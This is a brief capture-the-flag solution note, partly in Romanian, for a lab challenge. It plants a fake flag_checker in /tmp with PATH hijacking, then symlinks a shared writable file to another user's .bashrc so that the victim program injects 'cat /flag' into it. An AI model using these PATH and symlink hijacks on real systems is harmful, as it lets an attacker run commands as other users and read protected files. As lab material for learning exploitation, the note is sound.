.BASHRC input hijaking

______________________________________________

cat > /tmp/flag_checker << 'EOF'
#!/bin/bash
echo "Type the flag"
cat 
EOF

chmod +x /tmp/flag_checker
export PATH="/tmp:$PATH"


_____________________________________________

Zardus nu mai foloseste la runtime flag_checker ci salveaza 
un format cat /flag in > /tmp/collab/evil-commands.txt

ca sa rezolv avem :

rm /tmp/collab/evil-commands.txt
ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt

/challenge/victim
/challenge/victim


